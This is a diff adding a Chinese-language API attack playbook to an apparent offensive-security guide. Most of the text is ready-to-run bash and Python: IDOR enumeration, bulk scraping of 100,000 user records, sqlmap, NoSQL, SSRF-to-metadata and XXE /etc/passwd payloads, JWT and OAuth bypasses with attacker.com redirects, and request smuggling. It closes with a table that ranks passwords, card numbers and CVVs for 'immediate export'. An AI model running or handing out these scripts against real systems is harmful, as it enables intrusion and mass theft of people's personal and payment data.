@@ -2371,6 +2371,414 @@ Clear-EventLog -LogName Application,Security,System
 - GraphQL：内省查询、批量查询、嵌套查询DoS
 - JWT攻击：None算法、密钥混淆、KID注入
 
+
+**API接口攻防实战（深度经验）：**
+
+### API接口发现（5分钟）
+
+```bash
+#!/bin/bash
+# API接口全自动发现
+
+TARGET=$1
+
+echo "[+] 阶段1: API文档发现（1分钟）"
+# Swagger/OpenAPI
+for path in /swagger /swagger-ui /api-docs /openapi.json /v3/api-docs /docs /api/docs /swagger.json; do
+    curl -s "$TARGET$path" | grep -q "swagger\|openapi" && echo "[+] $TARGET$path"
+done
+
+# GraphQL
+for path in /graphql /graphiql /graphql/playground /api/graphql; do
+    curl -s "$TARGET$path" -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' | grep -q "__schema" && echo "[+] $TARGET$path"
+done
+
+# API文档站点
+for path in /api/v1 /api/v2 /rest /v1 /v2 /api/rest; do
+    curl -s "$TARGET$path" | grep -q "api\|endpoint\|method" && echo "[+] $TARGET$path"
+done
+
+echo "[+] 阶段2: JS文件分析（2分钟）"
+# 提取JS文件中的API端点
+katana -u "$TARGET" -js-crawl -f qurl | grep "\.js$" > js_files.txt
+for js in $(cat js_files.txt); do
+    curl -s "$js" | grep -oE "['\"](https?://[^'\"]+)?/api[^'\"]*['\"]" | sort -u
+done | sort -u > api_endpoints.txt
+
+echo "[+] 阶段3: 目录扫描（2分钟）"
+# API常见路径
+ffuf -u "$TARGET/FUZZ" -w api_wordlist.txt -mc 200,201,403 -o api_paths.txt
+# api_wordlist.txt包含: /api, /api/v1, /api/v2, /rest, /graphql, /api/users, /api/orders等
+
+echo "[+] 发现API端点: $(wc -l < api_endpoints.txt)个"
+```
+
+### API接口测试流程（15分钟）
+
+```bash
+#!/bin/bash
+# API接口快速测试
+
+API_ENDPOINT=$1
+
+echo "[+] 阶段1: 信息收集（3分钟）"
+# 1. 请求方法测试
+curl -X GET "$API_ENDPOINT" -v 2>&1 | grep -E "HTTP|Allow|OPTIONS"
+curl -X POST "$API_ENDPOINT" -v 2>&1 | grep -E "HTTP|Allow"
+curl -X PUT "$API_ENDPOINT" -v 2>&1 | grep -E "HTTP|Allow"
+curl -X DELETE "$API_ENDPOINT" -v 2>&1 | grep -E "HTTP|Allow"
+curl -X PATCH "$API_ENDPOINT" -v 2>&1 | grep -E "HTTP|Allow"
+
+# 2. 认证检查
+curl -X GET "$API_ENDPOINT" -H "Authorization: Bearer test" 2>&1 | grep -E "401|403|200"
+curl -X GET "$API_ENDPOINT" -H "X-API-Key: test" 2>&1 | grep -E "401|403|200"
+curl -X GET "$API_ENDPOINT" -u "test:test" 2>&1 | grep -E "401|403|200"
+
+# 3. 参数分析
+curl -X GET "$API_ENDPOINT?id=1" 2>&1 | tee response1.txt
+curl -X GET "$API_ENDPOINT?id=2" 2>&1 | tee response2.txt
+diff response1.txt response2.txt  # 识别参数影响
+
+echo "[+] 阶段2: IDOR测试（5分钟）"
+# 1. ID枚举测试
+for id in {1..100}; do
+    curl -s "$API_ENDPOINT?id=$id" | grep -q "error\|not found" || echo "[+] ID $id 可访问"
+done
+
+# 2. 水平越权测试
+curl -X GET "$API_ENDPOINT/user/1" -H "Authorization: Bearer user_token"
+curl -X GET "$API_ENDPOINT/user/2" -H "Authorization: Bearer user_token"  # 测试能否访问其他用户
+
+# 3. 垂直越权测试
+curl -X GET "$API_ENDPOINT/admin/users" -H "Authorization: Bearer user_token"  # 普通用户访问管理员接口
+
+echo "[+] 阶段3: 批量数据导出（5分钟）"
+# 1. 分页遍历
+for page in {1..1000}; do
+    curl -s "$API_ENDPOINT?page=$page&limit=100" | jq '.data[]' >> all_data.json
+done
+
+# 2. ID批量枚举
+seq 1 100000 | xargs -P 50 -I {} curl -s "$API_ENDPOINT?id={}" | jq '.' >> all_ids.json
+
+# 3. 时间范围遍历
+for date in $(seq -f "%Y-%m-%d" 0 365); do
+    curl -s "$API_ENDPOINT?date=$date" | jq '.data[]' >> all_dates.json
+done
+
+echo "[+] 阶段4: 漏洞测试（2分钟）"
+# 1. SQL注入
+sqlmap -u "$API_ENDPOINT?id=1" --batch --level=3
+
+# 2. NoSQL注入
+curl -X POST "$API_ENDPOINT" -H "Content-Type: application/json" -d '{"id":{"$ne":1}}'
+
+# 3. SSRF
+curl -X POST "$API_ENDPOINT" -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
+
+# 4. XXE
+curl -X POST "$API_ENDPOINT" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+```
+
+### REST API攻防重点
+
+**REST API常见漏洞：**
+```
+1. 认证绕过
+   - 无认证接口 → 直接访问
+   - Token弱校验 → 伪造/重放
+   - JWT None算法 → 伪造admin
+   - API Key泄露 → GitHub搜索
+
+2. 授权绕过
+   - IDOR → 枚举ID访问他人数据
+   - 水平越权 → 修改参数访问其他用户
+   - 垂直越权 → 普通用户访问管理员接口
+   - 对象级授权缺失 → 直接访问敏感对象
+
+3. 参数污染
+   - 同名参数 → /api/user?id=1&id=2
+   - 数组注入 → /api/user?ids[]=1&ids[]=2
+   - JSON注入 → {"id":1,"id":2}
+   - 请求走私 → Transfer-Encoding: chunked
+
+4. 批量操作
+   - 分页遍历 → 导出所有数据
+   - ID枚举 → 批量访问
+   - 时间范围 → 遍历所有日期
+   - 并发请求 → 绕过限流
+```
+
+**REST API测试优先级：**
+```
+高优先级（立即测试）：
+├─ /api/user/{id} → IDOR枚举（10万级）
+├─ /api/order/{id} → 订单数据（交易信息）
+├─ /api/admin/* → 垂直越权（提权）
+└─ /api/export → 批量导出（全部数据）
+
+中优先级（快速测试）：
+├─ /api/search → SQL注入/NoSQL注入
+├─ /api/upload → 文件上传绕过
+└─ /api/request → SSRF测试
+
+低优先级（最后测试）：
+└─ 其他接口 → 常规漏洞测试
+```
+
+### GraphQL攻防实战
+
+**GraphQL内省查询（获取所有字段）：**
+```graphql
+# 1. 内省查询Schema
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+
+# 2. 查询所有类型
+query {
+  __type(name: "Query") {
+    fields {
+      name
+      args {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+
+# 3. 批量查询（绕过限流）
+query {
+  user1: user(id: 1) { email name }
+  user2: user(id: 2) { email name }
+  user3: user(id: 3) { email name }
+  # ... 一次查询1000个用户
+}
+
+# 4. 嵌套查询DoS
+query {
+  user {
+    posts {
+      comments {
+        user {
+          posts {
+            comments {
+              # 深度嵌套导致DoS
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+**GraphQL自动化测试：**
+```bash
+#!/bin/bash
+# GraphQL快速测试
+
+GRAPHQL_URL="$1"
+
+# 1. 内省查询
+curl -X POST "$GRAPHQL_URL" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}' | jq '.'
+
+# 2. 批量查询测试
+curl -X POST "$GRAPHQL_URL" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user1:user(id:1){email} user2:user(id:2){email} user3:user(id:3){email} }"}' | jq '.'
+
+# 3. 嵌套查询DoS
+curl -X POST "$GRAPHQL_URL" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user { posts { comments { user { posts { comments { id } } } } } } }"}'
+
+# 4. 字段名枚举
+graphql-cop "$GRAPHQL_URL"
+```
+
+### API认证绕过技巧
+
+**JWT绕过：**
+```bash
+# 1. None算法
+# 修改Header: {"alg":"none"}
+# 删除Signature，保留Header和Payload
+
+# 2. 弱密钥爆破
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# 3. KID注入（路径遍历）
+# Header: {"alg":"HS256","kid":"../../../etc/passwd"}
+# 使用/etc/passwd内容作为密钥
+
+# 4. 密钥混淆
+# RS256 → HS256（公钥作为HMAC密钥）
+
+# 5. 时间戳绕过
+# 修改exp为未来时间
+```
+
+**OAuth绕过：**
+```bash
+# 1. 状态参数缺失
+# 正常: /oauth?client_id=xxx&redirect_uri=xxx&state=random
+# 攻击: /oauth?client_id=xxx&redirect_uri=attacker.com&state=xxx
+
+# 2. redirect_uri绕过
+# 白名单: https://target.com/callback
+# 绕过: https://target.com/callback.attacker.com
+# 绕过: https://target.com/callback?next=attacker.com
+
+# 3. 授权码复用
+# 获取授权码后多次使用（如果服务端未校验）
+
+# 4. 客户端伪造
+# 修改client_id为其他客户端
+```
+
+**API Key绕过：**
+```bash
+# 1. GitHub搜索泄露
+# 搜索: "api_key" OR "apiKey" OR "apikey" site:github.com target.com
+
+# 2. JS文件提取
+# 从前端JS文件中提取API Key
+
+# 3. 环境变量泄露
+# /.env, /config, /.git/config
+
+# 4. 历史版本
+# Wayback Machine查找旧版本API Key
+```
+
+### API参数污染攻击
+
+**HTTP参数污染（HPP）：**
+```bash
+# 1. 同名参数
+GET /api/user?id=1&id=2
+# 后端可能取第一个或最后一个
+
+# 2. JSON参数污染
+POST /api/user
+{"id":1,"id":2}
+# 某些解析器可能取第一个或最后一个
+
+# 3. 数组注入
+GET /api/user?ids[]=1&ids[]=2&ids[]=3
+# 绕过数组长度限制
+
+# 4. 嵌套参数
+POST /api/user
+{"user":{"id":1},"user":{"id":2}}
+```
+
+**HTTP请求走私：**
+```bash
+# 1. CL.TE (Content-Length + Transfer-Encoding)
+POST /api/user HTTP/1.1
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# 2. TE.CL (Transfer-Encoding + Content-Length)
+POST /api/user HTTP/1.1
+Transfer-Encoding: chunked
+Content-Length: 3
+
+SMUGGLED
+
+# 3. H2C走私（HTTP/2降级）
+# 利用HTTP/2到HTTP/1.1的转换差异
+```
+
+### API批量数据挖掘
+
+**高价值数据识别：**
+```bash
+# 1. 敏感字段扫描
+curl -s "$API_ENDPOINT" | jq 'paths(leafs) as $p | {($p | join(".")): getpath($p)}' | grep -iE "password|token|key|secret|credit|ssn|email|phone"
+
+# 2. 数据量估算
+curl -s "$API_ENDPOINT?page=1&limit=100" | jq '.total'
+# 如果返回total字段，计算需要遍历的页数
+
+# 3. 批量导出脚本
+python3 << 'PYEOF'
+import requests
+import json
+import concurrent.futures
+
+def fetch_data(id):
+    r = requests.get(f"https://api.target.com/user/{id}", timeout=5)
+    if r.status_code == 200:
+        return r.json()
+    return None
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    results = list(executor.map(fetch_data, range(1, 100001)))
+    
+with open('all_users.json', 'w') as f:
+    json.dump([r for r in results if r], f, indent=2)
+PYEOF
+```
+
+**API数据价值评估：**
+```
+高价值数据（立即导出）：
+├─ 用户数据: email, phone, password_hash, ssn
+├─ 订单数据: order_id, amount, credit_card, cvv
+├─ 支付数据: transaction_id, payment_method, billing
+└─ 凭证数据: api_key, token, secret, access_key
+
+中价值数据（选择性导出）：
+├─ 个人信息: name, address, birthday
+├─ 业务数据: product_id, category, price
+└─ 日志数据: access_log, operation_log
+
+低价值数据（最后处理）：
+└─ 统计数据: count, sum, avg
+```
+
+### API攻击优先级矩阵
+
+```
+高优先级 + 高成功率 = 立即攻击
+├─ API接口 + 无认证 → 成功率80%+
+├─ API接口 + IDOR → 成功率70%+
+├─ GraphQL + 内省开放 → 成功率90%+
+└─ API接口 + 批量查询 → 成功率60%+
+
+中优先级 + 中成功率 = 快速测试
+├─ API接口 + 弱认证 → 成功率40-60%
+├─ REST API + 参数污染 → 成功率30-50%
+└─ API接口 + SQL注入 → 成功率50%+
+
+低优先级 + 低成功率 = 最后尝试
+└─ API接口 + 强认证 → 成功率<30%
+```
+
+---
+
 ### 2. 云原生攻防（多云）
 **AWS:**
 ```bash
